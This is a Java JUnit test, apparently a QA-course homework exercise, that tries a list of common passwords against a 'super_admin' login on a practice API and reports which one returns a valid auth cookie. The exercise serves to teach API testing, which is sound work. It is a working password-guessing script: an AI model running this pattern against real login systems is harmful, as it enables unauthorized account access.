import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class PasswordGuessing {
    @Test
    @DisplayName("Подбор пароля")
    public void guessPassword() {
        String commonPasswords[] = {"123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123", "abc123",
                "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"};
        for (String password : commonPasswords) {
            Map<String, String> body = new HashMap<>();
            body.put("login", "super_admin");
            body.put("password", password);

            Response response = RestAssured
                    .given()
                    .body(body)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String responseCookie = response.getCookie("auth_cookie");
            Map<String, String> cookies = new HashMap<>();
            cookies.put("auth_cookie", responseCookie);

            Response responseWithCookie = RestAssured
                    .given()
                    .cookies(cookies)
                    .when()
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            String wrightCookie = "You are authorized";
            String answer = responseWithCookie.print();

            if (answer.equals(wrightCookie)) {
                System.out.println("Верный пароль: " + password);
            }
        }
    }
}
